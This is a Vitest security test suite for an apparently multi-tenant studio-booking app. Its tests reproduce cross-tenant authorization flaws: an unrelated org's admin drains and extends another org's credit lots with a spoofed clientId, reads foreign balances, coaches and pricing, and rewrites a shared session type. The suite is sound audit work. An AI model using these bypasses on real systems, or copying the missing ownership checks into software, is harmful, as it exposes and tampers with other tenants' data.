import { beforeAll, describe, expect, it } from "vitest";
import { createUnrelatedOrgAdmin, createVerifiedEnrolledClient, getSeedOrg } from "../../support/fixtures";
import { getClientProfile, signInAs, type SignedInSession } from "../../support/test-users";

/**
 * Round 2 — cross-tenant IDOR findings in code that landed AFTER the baseline audit in
 * cross-tenant-idor.test.ts (docs/scenarios.md §1, commit 246b6bb → HEAD as of 2026-09-14).
 *
 * Headline: the original credits.* bug was never fixed, and the same missing-org-check pattern
 * was reproduced in fresh code three more times (`coaches.list`, `credits.getBalancesForClients`,
 * and — upgraded from a read to a read+WRITE — `sessionTypes.*`). See docs/scenarios.md §1 (new
 * rows 1.11–1.16) for the full write-up. Same "unrelated org's ordinary admin" attacker model as
 * the original suite — never the superadmin bypass, which is a separate documented axis.
 */
describe("cross-tenant IDOR — round 2: coaches, session-types, batched balances (docs/scenarios.md §1.11+)", () => {
  let victimClientId: string;
  let owner: SignedInSession;
  let attacker: SignedInSession;

  beforeAll(async () => {
    const seedOrg = await getSeedOrg();
    expect(seedOrg.id).toBeTruthy();

    const client = await signInAs("client");
    victimClientId = (await getClientProfile(client.client)).id;
    owner = await signInAs("owner");

    const unrelated = await createUnrelatedOrgAdmin("staff", "admin");
    attacker = unrelated.session;
  }, 30_000);

  it("1.11 — credits.reverse never checks lot ownership: an unrelated admin drains a lot they never touched, granted entirely by the real owner", async () => {
    const grant = await owner.client.post<{ data: { lotId: string } }>("/credits/grant", {
      clientId: victimClientId,
      creditType: "SGPT",
      amount: 2,
      expiresAt: null,
      centreScope: null,
      reason: "round-2 IDOR fixture — owner-granted lot the attacker never touches",
    });
    expect(grant.status).toBe(200);
    const lotId = grant.body?.data?.lotId;
    expect(lotId).toBeTruthy();

    // The attacker supplies a clientId belonging to a REAL but totally unrelated client — a row
    // that must satisfy the ledger's FK constraint, but has nothing to do with this lot's real
    // owner — if the route validated lot ownership via clientId, this should already be rejected.
    const bystander = await createVerifiedEnrolledClient("idor-v2-bystander");
    const bystanderClientId = (await getClientProfile(bystander.client)).id;

    const reverse = await attacker.client.post<{ data: { balanceAfter: number } }>(
      "/credits/reverse",
      {
        lotId,
        clientId: bystanderClientId, // spoofed — unrelated to the real lot's owner
        amount: 1,
        reason: "round-2 IDOR PoC — draining a lot with a spoofed clientId",
      },
    );
    // Finding: succeeds anyway. `reverseCredit` never cross-checks clientId against the lot's
    // actual owner — it's decremented by lotId alone, and the ledger records a completely
    // unrelated bystander client as the one who was debited (audit-log poisoning).
    expect(reverse.status).toBe(200);
    expect(reverse.body?.data?.balanceAfter).toBe(1);
  });

  it("1.12 — credits.extendExpiry never checks lot ownership: an unrelated admin extends a lot granted entirely by the real owner", async () => {
    const grant = await owner.client.post<{ data: { lotId: string } }>("/credits/grant", {
      clientId: victimClientId,
      creditType: "SGPT",
      amount: 1,
      expiresAt: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
      centreScope: null,
      reason: "round-2 IDOR fixture — owner-granted expiring lot",
    });
    const lotId = grant.body?.data?.lotId;
    expect(lotId).toBeTruthy();

    const extend = await attacker.client.post<{ data: { expiresAt: string | null } }>(
      "/credits/extend-expiry",
      {
        lotId,
        newExpiresAt: new Date(Date.now() + 365 * 24 * 3600 * 1000).toISOString(),
        reason: "round-2 IDOR PoC",
      },
    );
    expect(extend.status).toBe(200);
  });

  it("1.13 — credits.getBalancesForClients (new batched endpoint) leaks a foreign org's client balances to any elevated caller", async () => {
    const res = await attacker.client.post<{
      data: { clients: Array<{ clientId: string; balances: unknown[] }> };
    }>("/credits/balances-for-clients", { clientIds: [victimClientId] });
    expect(res.status).toBe(200);
    const row = res.body?.data?.clients?.find((c) => c.clientId === victimClientId);
    expect(row).toBeTruthy();
  });

  it("1.14 — coaches.list has no org filter at all: any org's admin sees every coach on the platform", async () => {
    const res = await attacker.client.get<{
      data: Array<{ id: string; name: string; centreName: string | null }>;
    }>("/coaches");
    expect(res.status).toBe(200);
    // The attacker's own throwaway org has zero coaches — any row at all proves cross-tenant leak.
    expect(res.body?.data?.some((c) => c.name === "Priya Coach")).toBe(true);
  });

  it("1.15 — sessionTypes.list/update: an unrelated admin can read AND rewrite a session type every other studio's schedule depends on", async () => {
    const list = await attacker.client.get<{
      data: Array<{ id: string; code: string; defaultCapacity: number }>;
    }>("/session-types");
    expect(list.status).toBe(200);
    const hiit = list.body?.data?.find((t) => t.code === "HIIT");
    expect(hiit).toBeTruthy();
    if (!hiit) return;

    const originalCapacity = hiit.defaultCapacity;
    const tamperedCapacity = originalCapacity === 77 ? 76 : 77;

    const update = await attacker.client.post<{ data: { defaultCapacity: number } }>(
      "/session-types/update",
      { id: hiit.id, defaultCapacity: tamperedCapacity },
    );
    // Finding: session_types has no organizationId column at all (by schema design) — any org's
    // admin can rewrite a catalog entry every other studio's class templates reference.
    expect(update.status).toBe(200);
    expect(update.body?.data?.defaultCapacity).toBe(tamperedCapacity);

    const restore = await owner.client.post("/session-types/update", {
      id: hiit.id,
      defaultCapacity: originalCapacity,
    });
    expect(restore.status).toBe(200);
  });

  it("1.16 — organizations.listPackages: any authenticated user (no org membership required) reads another studio's package catalog and pricing", async () => {
    const seedOrg = await getSeedOrg();
    // attacker is a genuine member of their own unrelated org, not the seed org — protectedProcedure
    // has no org-membership check on this route at all.
    const res = await attacker.client.get<{
      data: Array<{ id: string; name: string; pricePaise: number }>;
    }>(`/organizations/${seedOrg.slug}/packages`);
    expect(res.status).toBe(200);
    expect(res.body?.data?.some((p) => p.name === "10-Class SGPT Pack")).toBe(true);
  });
});
